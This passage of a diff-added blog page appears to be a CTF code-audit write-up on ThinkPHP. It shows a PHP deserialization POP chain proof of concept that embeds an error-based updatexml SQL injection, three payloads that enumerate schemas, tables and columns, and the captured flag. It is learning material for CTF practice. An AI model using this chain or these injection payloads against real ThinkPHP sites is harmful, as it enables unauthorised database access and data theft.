+        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">handle</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Model</span><span class="p">();</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">namespace</span> <span class="nx">Think</span><span class="p">{</span>
+    <span class="k">use</span> <span class="nx">Think\Db\Driver\Mysql</span><span class="p">;</span>
+    <span class="k">class</span> <span class="nc">Model</span><span class="p">{</span>
+        <span class="k">protected</span> <span class="nv">$options</span>   <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+        <span class="k">protected</span> <span class="nv">$pk</span><span class="p">;</span>
+        <span class="k">protected</span> <span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+        <span class="k">protected</span> <span class="nv">$db</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
+
+        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Mysql</span><span class="p">();</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">options</span><span class="p">[</span><span class="s1">&#39;where&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">pk</span> <span class="o">=</span> <span class="s1">&#39;id&#39;</span><span class="p">;</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span><span class="p">[</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">pk</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+                <span class="s2">&#34;table&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;mysql.user where 1=updatexml(1,concat(0x7e,substr((select f14g from tp.f14g),32,64),0x7e),1)#&#34;</span><span class="p">,</span>
+                <span class="s2">&#34;where&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;1=1&#34;</span>
+            <span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">namespace</span> <span class="p">{</span>
+    <span class="k">echo</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">Think\Image\Driver\Imagick</span><span class="p">()));</span>
+<span class="p">}</span>
+</code></pre></div><p>poc中查库查表语句如下：</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nx">concat</span><span class="p">(</span><span class="mh">0x7e</span><span class="p">,</span><span class="nx">substr</span><span class="p">((</span><span class="nx">select</span> <span class="nx">group_concat</span><span class="p">(</span><span class="nx">schema_name</span><span class="p">)</span> <span class="nx">from</span> <span class="nx">information_schema</span><span class="o">.</span><span class="nx">schemata</span><span class="p">),</span><span class="mi">32</span><span class="p">,</span><span class="mi">64</span><span class="p">),</span><span class="mh">0x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="nx">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nx">concat</span><span class="p">(</span><span class="mh">0x7e</span><span class="p">,</span><span class="nx">substr</span><span class="p">((</span><span class="nx">select</span> <span class="nx">group_concat</span><span class="p">(</span><span class="nx">table_name</span><span class="p">)</span> <span class="nx">from</span> <span class="nx">information_schema</span><span class="o">.</span><span class="nx">tables</span> <span class="nx">where</span> <span class="nx">table_schema</span><span class="o">=</span><span class="s1">&#39;tp&#39;</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">32</span><span class="p">),</span><span class="mh">0x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="nx">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nx">concat</span><span class="p">(</span><span class="mh">0x7e</span><span class="p">,</span><span class="nx">substr</span><span class="p">((</span><span class="nx">select</span> <span class="nx">group_concat</span><span class="p">(</span><span class="nx">column_name</span><span class="p">)</span> <span class="nx">from</span> <span class="nx">information_schema</span><span class="o">.</span><span class="nx">columns</span> <span class="nx">where</span> <span class="nx">table_name</span><span class="o">=</span><span class="s1">&#39;f14g&#39;</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">32</span><span class="p">),</span><span class="mh">0x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span>
+</code></pre></div><p><img src="https://gitee.com/leonsec/images/raw/master/image-20210402202541147.png" alt="image-20210402202541147"  /></p>
+<p><img src="https://gitee.com/leonsec/images/raw/master/image-20210402202206988.png" alt="image-20210402202206988"  /></p>
+<p><img src="https://gitee.com/leonsec/images/raw/master/image-20210402202149998.png" alt="image-20210402202149998"  /></p>
+<p><img src="https://gitee.com/leonsec/images/raw/master/image-20210402202043924.png" alt="image-20210402202043924"  /></p>
+<p><img src="https://gitee.com/leonsec/images/raw/master/image-20210402202110500.png" alt="image-20210402202110500"  /></p>
+<p>flag{07d47ce4-b5de-4671-9cdf-568fb9ec822f}</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">相关文章</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="has-image">
+    <a href="/p/%E8%99%8E%E7%AC%A6ctf-writeup-by-x1ct34m/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210404094446.png" loading="lazy" data-key="" data-hash="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210404094446.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">虎符CTF Writeup by X1cT34m</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/thinkphp5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312152311.jpeg" loading="lazy" data-key="" data-hash="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312152311.jpeg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">thinkphp5代码审计</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/p/debian%E4%B8%8Bphp-xdebug%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Debian下PHP Xdebug调试环境搭建</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "wh1sper" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (DISQUS) {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2019 - 
+        
+        2021 wh1sper
+    </section>
+    
+    <section class="powerby">
+        
+            welcome to wh1sper's blog <br/>
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="2.2.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
